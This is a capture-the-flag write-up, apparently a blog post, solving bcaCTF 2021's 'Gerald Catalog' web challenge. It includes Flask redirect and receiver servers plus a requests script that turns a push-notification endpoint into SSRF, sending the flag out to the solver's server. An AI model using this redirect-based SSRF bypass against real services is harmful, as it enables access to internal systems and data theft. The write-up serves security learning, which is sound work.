---
layout: post
title: bcaCTF 2021 - Gerald Catalog
---
b1c and Rogue Waves merged for a big 1st place (W over both redpwn teams!!) in bcaCTF 2021.

Though the pwn curve was pretty sad, I also solved a web challenge, Gerald Catalog.

## Gerald Catalog
Least solved challenge in the whole CTF!

The website we are given lets us view and create "Geralds". Gerald is just an image (of a stegosaurus). Each Gerald has a title and a caption. There is a Gerald with the flag, and only the admin can see it. Our goal is to get the contents of the flag Gerald.

We are also allowed to opt into push notifications. When a Gerald is viewed, we can opt into getting push notifications for view events. Viewing a corresponding Gerald will cause a push notification to be sent to one's browser, and a popup will be shown.

### source code
#### server.ts:

| Route                           | Purpose                                                                  |
|---------------------------------|--------------------------------------------------------------------------|
| GET /                           | index page                                                               |
| GET /login                      | login page                                                               |
| POST /login                     | login api                                                                |
| GET /register                   | register page                                                            |
| POST /register                  | register api                                                             |
| GET /logout                     | logout of account                                                        |
| GET /geralds                    | view one's geralds + the flag gerald                                     |
| GET /gerald/:id                 | view a specific Gerald, this also triggers push notifications to be sent |
| GET /gerald.png                 | render a Gerald image with specific caption                              |
| GET /add                        | create a Gerald page                                                     |
| POST /add                       | create a Gerald api                                                      |
| PUT /gerald/:id/subscription    | subscribe to push notifications for a specific Gerald                    |
| DELETE /gerald/:id/subscription | unsubscribe to push notifications for a specific Gerald                  |

#### notify.ts
`validateSubscription()`:
Ensures that a subscription's fields:
- have string `endpoint`
- have string `keys.auth`
- have string `keys.p256dn`
- `endpoint`:
    - no port specification (thus on either port 80 or 443)
    - hostname is not `localhost` or a Docker localhost network
    - hostname does not have `bcactf.com` in it
    - hostname does not have `192.168.` in it
    - hostname does not start with `127.`
    - protocol must be `http` or `https`

`sendNotifications()`:
Sends an encrypted `web-push` push notification that contains the id, name, and caption using `fetch` to our endpoint.

### ssrf
When we opt in for push notifications with a PUT to /gerald/:id/subscription, we can specify the endpoint for where the notification should go to. The validation in `validateSubscription` makes it seem like it was meant to prevent SSRF, so obviously we should try to find another way of achieving SSRF.

In `sendNotifications()`, `fetch` will follow all redirects that our endpoint returns. So, we can make our endpoint redirect to `localhost/path`, and `fetch` will go to that endpoint instead, giving us SSRF.

### getting the encrypted flag
Using our SSRF from before, we can get push notification containing the encrypted contents of the flag.

We will need two servers, one to redirect `fetch` for SSRF and one to receive the encrypted flag. Technically it might be possible to have one server with one application running on port 80 and another on port 443, but I just used my two existing EC2 instances.

For reference, the id of my flag Gerald was `a5721434-b800-4c97-b3cd-8f05ba6911ab`. The id of the dummy Gerald was `510afe9e-ae77-45e9-922a-fccf9914516b`.

On server A, this is the Flask code:
```python
from flask import Flask, redirect

app = Flask(__name__)

@app.errorhandler(404)
def hello(a):
        return redirect("http://127.0.0.1:1337/gerald/a5721434-b800-4c97-b3cd-8f05ba6911ab", code=302)


app.run(host='0.0.0.0', port=80)
```

The 404 error handler just makes it so that every route requested from server A will be redirected to the `localhost` url.


On server B, this is the Flask code:
```python
from flask import Flask, redirect, request
import base64

app = Flask(__name__)

@app.errorhandler(404)
def hello(a):
        print(request.headers)
        print("rcvd: ", base64.b64encode(request.data))
        return 'lol'


app.run(host='0.0.0.0', port=80)
```

This code returns the base64 encoding of any data received.

Remember that the flag will be encrypted when we receive it. Generally, browsers will do the decryption for us but I couldn't figure out how to plug encrypted output into the browser.

Instead to decrypt it, I just generated a keypair with [this site](https://tools.reactpwa.com/vapid).

The public key from that site is `p256dh`, and I just took the `auth` value from a sample request from the Network tab in developer tools. The private key from the site will be used to decrypt the encrypted flag later on.

To set up push notifications:
```python
import requests

s = requests.Session()

a = s.post("https://web.bcactf.com:49163/login", data={"username":[REDACTED], "password":[REDACTED]}, verify=False)

b = s.get("https://web.bcactf.com:49163/geralds", verify=False)

p = s.put("https://web.bcactf.com:49163/gerald/510afe9e-ae77-45e9-922a-fccf9914516b/subscription",
        headers={
            "Host": "web.bcactf.com:49163"
            },
        json={
            "endpoint":[SERVER A],
            "expirationTime":None,
            "keys": {
                "p256dh":[PUBLIC KEY],
                "auth":[AUTH FROM SAMPLE REQUEST]
            }
        }, verify=False)


p = s.put("https://web.bcactf.com:49163/gerald/a5721434-b800-4c97-b3cd-8f05ba6911ab/subscription",
        headers={
            "Host": "web.bcactf.com:49163"
            },
        json={
            "endpoint":[SERVER B],
            "expirationTime":None,
            "keys": {
                "p256dh":[PUBLIC KEY],
                "auth":[AUTH FROM SAMPLE REQUEST]
            }
        }, verify=False)

print(p.ok)
print(p.text)
```

This sets up two push notification events. One will trigger when we view `510afe9e-ae77-45e9-922a-fccf9914516b`, and will trigger the SSRF by a redirect from server A.

This causes the server to "view" `a5721434-b800-4c97-b3cd-8f05ba6911ab` when `fetch` follows the redirect. Viewing `a5721434-b800-4c97-b3cd-8f05ba6911ab` will cause another push notification containing the encrypted flag to be sent to our server B, which prints out the base64 encoding of it.

### decrypting the flag
To decrypt the flag, I used [https://github.com/web-push-libs/ecec](https://github.com/web-push-libs/ecec). There is a convenient decryption utility that is included in the build instructions.

To use it, we'll need our auth secret (the `auth` field of our request), the private key that we generated, and the URL-safe base64 version of the data received by our server.

Make sure that both the auth secret, the private key, and the message are in URL-safe base64 encoding, not just base64, or else the decryption will fail. I used [this tool](https://www.base64url.com/) to convert.

Flag: `bcactf{thanks_f0r_contributing_t0_th3_g3rard_lore_ssrf478fhgh}`